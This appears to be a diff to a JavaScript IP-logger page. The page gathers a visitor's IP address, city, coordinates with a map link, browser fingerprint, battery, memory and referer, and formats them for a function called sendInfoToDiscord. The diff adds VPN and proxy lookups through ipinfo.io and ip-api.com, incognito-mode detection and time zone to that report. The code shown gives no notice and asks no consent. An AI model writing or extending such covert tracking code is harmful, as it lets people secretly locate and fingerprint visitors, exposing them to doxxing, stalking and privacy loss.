@@ -307,12 +307,28 @@ async function checkAdBlock() {
     return isAdBlockActive ? "Ad Blocker Detected" : "No Ad Blocker";
 }
 
-        async function checkVPN() {
-            // Простая проверка VPN через IP-адрес. Полностью достоверный способ не гарантируется.
-            const response = await fetch("https://ipinfo.io/json");
-            const data = await response.json();
-            return data.hostname ? `VPN Service Detected: ${data.hostname}` : "No VPN Detected";
-        }     
+async function checkVPN() {
+    try {
+        const response = await fetch("https://ipinfo.io/json");
+        const data = await response.json();
+
+        if (data.org && (data.org.toLowerCase().includes("vpn") || data.org.toLowerCase().includes("hosting"))) {
+            return `VPN Service Detected: ${data.org}`;
+        }
+
+        const response2 = await fetch("https://ip-api.com/json/");
+        const geoData = await response2.json();
+
+        if (geoData && geoData.proxy === true) {
+            return `VPN Service Detected: ${geoData.isp}`;
+        }
+
+        return "No VPN Detected";
+    } catch (error) {
+        return "Error detecting VPN";
+    }
+}
+   
 
         function getConnectionType() {
             if (navigator.connection) {
@@ -406,6 +422,31 @@ function areCookiesEnabled() {
             }
         }
 
+async function getProxyInfo() {
+    try {
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        
+        if (data && data.org && data.org.toLowerCase().includes('proxy')) {
+            return `Proxy detected: ${data.org}`;
+        } else {
+            return "No proxy detected";
+        }
+    } catch (error) {
+        return "Error determining proxy";
+    }
+}
+
+async function detectIncognitoMode() {
+    return new Promise((resolve) => {
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) {
+            resolve(false); // Если FileSystem API не поддерживается, не инкогнито
+        } else {
+            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+        }
+    });
+}
 
 async function sendInfoToDiscord() {
     const { city, country, coordinates, emoji } = await getCityCountryAndEmoji();
@@ -440,6 +481,9 @@ async function sendInfoToDiscord() {
     const CPUard = getCpuCores();
     const monitorRefreshRate = await getMonitorRefreshRate();
     const memoryUsage = getMemoryUsage();
+    const proxyInfo = await getProxyInfo();
+    const TimeZone = await Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const isIncognito = await detectIncognitoMode();
     const message = "****                User Information****\n" +
                     "****-----------------------------------****\n" +
                     "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
@@ -448,6 +492,7 @@ async function sendInfoToDiscord() {
                     "- 🌍 **Country**: `" + country + "` " + emoji + "\n" +
                     "- 🏞️ **Coordinates**: [`" + coordinates + "`](" + googleMapsLink + ")\n" +
                     "- 🕒 **Time**: `" + time + "`\n" +
+                    "- 🌚 **Time Zone**: `" + TimeZone + "`\n" +
                     "- 🌐 **Browser**: `" + browserInfo + "`\n" +
                     "- 💿️ **Browser Version**: `" + version + "`\n" +
                     "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
@@ -461,8 +506,10 @@ async function sendInfoToDiscord() {
                     "- 🖥️ **Device Language(s)**: `" + navigator.languages.join(", ") + "`\n" +
                     "- 🔋 **Battery**: `" + batteryInfo + "`\n" +
                     "- 💨 **Referer**: `" + referer + "`\n" +
+                    "- ♟ **Incognito Mode**: `" + isIncognito + "`\n" +
                     "- 🚫 **Ad Blocker**: `" + adBlockStatus + "`\n" +
-                    "- 🔒 **VPN Status**: `" + vpnStatus + "`\n" +
+                    "- 🕵 **VPN**: `" + vpnStatus + "`\n" +
+                    "- 🔒 **Proxy**: `" + proxyInfo + "`\n" +
                     "- 🌗 **System Theme**: `" + WindowsThearmType + "`\n" +                 
                     "- 💻 **Device Memory**: `" + deviceMemoryGB + " GB`\n" +
                     "- 🕳️ **CPU Core**: `" + CPUard + "`\n" +
